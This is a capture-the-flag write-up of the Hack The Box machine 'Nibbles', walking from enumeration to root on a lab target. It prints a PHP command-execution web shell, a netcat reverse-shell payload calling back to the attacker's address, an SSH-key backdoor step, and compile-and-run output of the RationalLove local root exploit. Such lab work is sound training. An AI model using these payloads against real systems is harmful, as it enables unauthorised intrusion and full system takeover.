---
title: "HTB - Nibbles"
classes: wide
tag:
- "Sudo Exploitation"
- "Backdoor"
- "Easy Box"
- "TJ_Null's OSCP Prep"
header:
  teaser: /assets/images/htb/htb.png
ribbon: lawngreen
description: "Writeup for HTB - Nibbles"
categories:
  - HTB
---

- [BoxInfo- Nibbles](#boxinfo)
- [Recon](#recon)
	- [Nmap Scan](#nmap-scan)
- [Enumeration](#enumeration)
	- [Site](#site)
	- [Directory Bruteforcing](#directory-bruteforcing)
	- [Exploit Nibbleblog](#nibbleblog)
- [Shell as nibbler](#shell)
	- [Backdoor](#backdoor)
- [Shell as root](#shell-as-root)
	- [Sudo exploitation](#sudo)
	- [RationalLove exploitation](#rationallove)

## BoxInfo- Nibbles

The given box ```Nibbles``` is a Linux machine. It hosts a vulnerable instance of [nibbleblog](http://www.nibbleblog.com/). There’s a Metasploit exploit for it, but I'll perform manual way to exploit. The privesc involves abusing `sudo` on a file that is world-writable and through `linux exploit suggestor` we can escalate the privilege.

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/nibbles/assets/images/Nibbles.png" >
</center>

## Recon

### Nmap Scan

`nmap` found 2 open port on TCP scan.

```shell
┌[us-vip-1]─[10.10.16.3][0xM3M0RY㉿kali]─[~/htb/easy_nibbles]
└╼[★]$ cat nmap/initials_scan.nmap
# Nmap 7.92 scan initiated Sat Sep 17 20:09:34 2022 as: nmap -sC -sV -oN nmap/initials_scan.nmap -v 10.10.10.75
Increasing send delay for 10.10.10.75 from 0 to 5 due to 51 out of 168 dropped probes since last increase.
Increasing send delay for 10.10.10.75 from 5 to 10 due to 11 out of 13 dropped probes since last increase.
Nmap scan report for 10.10.10.75
Host is up (0.31s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 17 20:10:16 2022 -- 1 IP address (1 host up) scanned in 42.46 seconds
```

## Enumeration

### Site

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/nibbles/assets/images/1.png" >
</center>

enumerated the website through `burpsuite` and got a directory `/nibbleblog`

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/nibbles/assets/images/2.png" >
</center>

### /nibbleblog site

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/nibbles/assets/images/3.png" >
</center>

### Directory bruteforce

```shell
┌[us-vip-1]─[10.10.16.3][0xM3M0RY㉿kali]─[~/htb/easy_nibbles/bf]
└╼[★]$ gobuster dir -u http://10.10.10.75/nibbleblog/ -w Common-PHP-Filenames.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.75/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Common-PHP-Filenames.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/17 23:31:37 Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 4737]
/admin.php            (Status: 200) [Size: 1401]
/install.php          (Status: 200) [Size: 78]
/update.php           (Status: 200) [Size: 1622]
/sitemap.php          (Status: 200) [Size: 543]
/feed.php             (Status: 200) [Size: 695]
```

	/update.php

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/nibbles/assets/images/4.png" >
</center>

	/admin.php

There is no default credentials and if we try multiple times the `IP` will get blacklisted so I tried with 

	username: admin
	password: nibbles

It worked!!!

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/nibbles/assets/images/5.png" >
</center>

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/nibbles/assets/images/6.png" >
</center>

### Exploit Nibbleblog

[Reference to exploit](https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html)

From the above blog got the steps to exploit it and get the reverse shell.

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/nibbles/assets/images/7.png" >
</center>

So, we have created a php one-liner to execute the commands in the webpage itself.

```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die;  }?> ?>
```

`/nibbleblog/content/private/plugins/my_image/image.php?cmd=whoami`

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/nibbles/assets/images/8.png" >
</center>

Intercept through burp and change the http method,

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/nibbles/assets/images/9.png" >
</center>

## Shell as nibbler

In the POST method `cmd` query parameter given the reverse shell payload to get the connection back and it worked!!!

```payload
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.2 9001 >/tmp/f
```

<center>
<img src="https://raw.githubusercontent.com/0xM3M0RY/htb_ctf/main/nibbles/assets/images/10.png" >
</center>

```shell
┌[us-vip-1]─[10.10.16.3][0xM3M0RY㉿kali]─[~]
└╼[★]$ rlwrap nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.75] 42948
sh: 0: can't access tty; job control turned off
$ which python
$ which python3
/usr/bin/python3
$ python3 -c "import pty;pty.spawn('/bin/bash')"
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ whoami
<ml/nibbleblog/content/private/plugins/my_image$ whoami
nibbler
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ id
id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ifconfig
<ml/nibbleblog/content/private/plugins/my_image$ ifconfig
ens192    Link encap:Ethernet  HWaddr 00:50:56:b9:7f:f0
          inet addr:10.10.10.75  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: dead:beef::250:56ff:feb9:7ff0/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:7ff0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1242317 errors:0 dropped:569 overruns:0 frame:0
          TX packets:911019 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:197030818 (197.0 MB)  TX bytes:372532639 (372.5 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:6143 errors:0 dropped:0 overruns:0 frame:0
          TX packets:6143 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:604076 (604.0 KB)  TX bytes:604076 (604.0 KB)
```

### Backdoor

From the `nmap` scan we got 2 ports open in that port 22 is `SSH`, so after getting into the shell looked for `.ssh` folder but in this machine its not there so created the folder and added the `authorized_keys` to connect from local through SSH.

```shell
┌[us-vip-1]─[10.10.16.3][0xM3M0RY㉿kali]─[~/htb/easy_nibbles]
└╼[★]$ ssh-keygen -f nibbler
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in nibbler
Your public key has been saved in nibbler.pub
The key fingerprint is:
SHA256:HF7VazfnslPgfEefrAukCh48rUuJRr03/iqsdQ52U5g 0xM3M0RY@kali
The key's randomart image is:
+---[RSA 3072]----+
|            ..   |
|           .  .  |
|        . .    . |
|    .  ooo    +.+|
|   . . ES. . +.==|
|  . o + . o   +o*|
|   o.% B . .  .=.|
|  . =o% +   ..o  |
|   ..+o=o.   ... |
+----[SHA256]-----+
```

## Shell as root

### Sudo exploitation

	Privesc : sudo exploitation and RationalLove exploitation  

```shell
nibbler@Nibbles:~$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

```shell
nibbler@Nibbles:~/personal/stuff$ cat monitor.sh
su
nibbler@Nibbles:~/personal/stuff$ sudo ./monitor.sh
root@Nibbles:/home/nibbler/personal/stuff# cd /root
root@Nibbles:~# ls
root.txt
```

### RationalLove exploitation 

Through `linux exploit suggester` we got `rationallove` exploit and we confirmed the ldd version

```shell
[+] [CVE-2018-1000001] RationalLove

   Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
   Exposure: less probable
   Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
   Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
   Comments: kernel.unprivileged_userns_clone=1 required
```

```shell
nibbler@Nibbles:/tmp$ ldd --version
ldd (Ubuntu GLIBC 2.23-0ubuntu9) 2.23
Copyright (C) 2016 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
Written by Roland McGrath and Ulrich Drepper.
```

[Exploit](https://github.com/5H311-1NJ3C706/local-root-exploits/blob/master/linux/CVE-2018-1000001/RationalLove.c)

```shell
nibbler@Nibbles:/tmp$ gcc -o RationalLove RationalLove.c
RationalLove.c: In function ‘createStackWriteFormatString’:
RationalLove.c:549:19: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
   int writeCount=((int)mainFunctionReturnAddress-18)&0xffff;
                   ^
RationalLove.c:559:16: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
   writeCount=(((int)argvStackAddress)-(writeCount+56))&0xffff;
                ^
RationalLove.c: In function ‘attemptEscalation’:
RationalLove.c:734:50: warning: format ‘%lx’ expects argument of type ‘long unsigned int *’, but argument 3 has type ‘int *’ [-Wformat=]
             result=sscanf(readBuffer+moveLength, "%016lx",
                                                  ^
nibbler@Nibbles:/tmp$ ls -al
total 220
drwxrwxrwt  9 root    root     4096 Sep 17 09:36 .
drwxr-xr-x 23 root    root     4096 Dec 15  2020 ..
prw-r--r--  1 nibbler nibbler     0 Sep 17 09:14 f
drwxrwxrwt  2 root    root     4096 Sep 16 13:51 .font-unix
drwxrwxrwt  2 root    root     4096 Sep 16 13:51 .ICE-unix
-rw-rw-r--  1 nibbler nibbler 89641 Sep 17  2022 les.sh
-rwxrwxr-x  1 nibbler nibbler 24292 Sep 17  2022 linux-exploit-suggester-2.pl
-rwxrwxr-x  1 nibbler nibbler 33696 Sep 17 09:36 RationalLove
-rw-rw-r--  1 nibbler nibbler 35470 Sep 17  2022 RationalLove.c
drwx------  3 root    root     4096 Sep 16 13:51 systemd-private-6c3e59668cd542dea7f0da39aef5b4c1-systemd-timesyncd.service-1O6Imi
drwxrwxrwt  2 root    root     4096 Sep 16 13:51 .Test-unix
drwx------  2 root    root     4096 Sep 16 13:52 vmware-root
drwxrwxrwt  2 root    root     4096 Sep 16 13:51 .X11-unix
drwxrwxrwt  2 root    root     4096 Sep 16 13:51 .XIM-unix
nibbler@Nibbles:/tmp$ ./RationalLove
./RationalLove: setting up environment ...
Detected OS version: "16.04.3 LTS (Xenial Xerus)"
./RationalLove: using umount at "/bin/umount".
No pid supplied via command line, trying to create a namespace
CAVEAT: /proc/sys/kernel/unprivileged_userns_clone must be 1 on systems with USERNS protection.
Namespaced filesystem created with pid 23898
Attempting to gain root, try 1 of 10 ...
Starting subprocess
Stack content received, calculating next phase
Found source address location 0x7ffd51dd5e68 pointing to target address 0x7ffd51dd5f38 with value 0x7ffd51dd823f, libc offset is 0x7ffd51dd5e58
Changing return address from 0x7fb12375c830 to 0x7fb1237fbe00, 0x7fb123808a20
Using escalation string %69$hn%73$hn%1$9087.9087s%67$hn%1$1.1s%71$hn%1$23601.23601s%68$hn%72$hn%1$2671.2671s%70$hn%1$13280.13280s%66$hn%1$16896.16896s%1$24134.24134s%1$s%1$s%65$hn%1$s%1$s%1$s%1$s%1$s%1$s%1$186.186s%39$hn-%35$lx-%39$lx-%64$lx-%65$lx-%66$lx-%67$lx-%68$lx-%69$lx-%70$lx-%71$lx-%78$s
Executable now root-owned
Cleanup completed, re-invoking binary
/proc/self/exe: invoked as SUID, invoking shell ...
# id
uid=0(root) gid=0(root) groups=0(root),1001(nibbler)
# whoami
root
# ifconfig
ens192    Link encap:Ethernet  HWaddr 00:50:56:b9:7f:f0
          inet addr:10.10.10.75  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: dead:beef::250:56ff:feb9:7ff0/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:7ff0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1246080 errors:0 dropped:608 overruns:0 frame:0
          TX packets:912748 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:197464211 (197.4 MB)  TX bytes:372724538 (372.7 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:6143 errors:0 dropped:0 overruns:0 frame:0
          TX packets:6143 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:604076 (604.0 KB)  TX bytes:604076 (604.0 KB)

#
```